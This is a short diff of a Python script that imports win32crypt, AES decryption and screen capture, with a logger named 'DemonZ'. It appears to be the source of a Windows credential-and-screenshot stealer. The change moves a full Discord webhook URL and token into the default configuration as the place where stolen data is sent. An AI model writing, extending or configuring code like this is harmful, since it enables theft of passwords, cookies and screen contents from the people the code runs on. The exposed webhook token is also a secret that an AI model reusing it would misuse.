@@ -23,7 +23,7 @@ from Crypto.Cipher import AES
 import win32crypt
 import time
 from PIL import ImageGrab
-webhook = "https://discord.com/api/webhooks/1562106579178881055/pfLLNaob-gggXQBusYwGf0BkID_6d6ORule84q39E6MgbpvhkPIHETrJzRGCdBMhS1mf"
+webhook = "Webhooksss"
 
 logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
 Logger = logging.getLogger("DemonZ")
@@ -52,7 +52,7 @@ install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher.AES", "pycryptodome
 
 # Default configuration
 DEFAULT_CONFIG = {
-    "webhook_urls": ["Webhooksss"],
+    "webhook_urls": ["https://discord.com/api/webhooks/1562106579178881055/pfLLNaob-gggXQBusYwGf0BkID_6d6ORule84q39E6MgbpvhkPIHETrJzRGCdBMhS1mf"],
     "avatar_url": "https://i.imgur.com/example.png",
     "embed_color": 9109504,
     "timeout": 10,
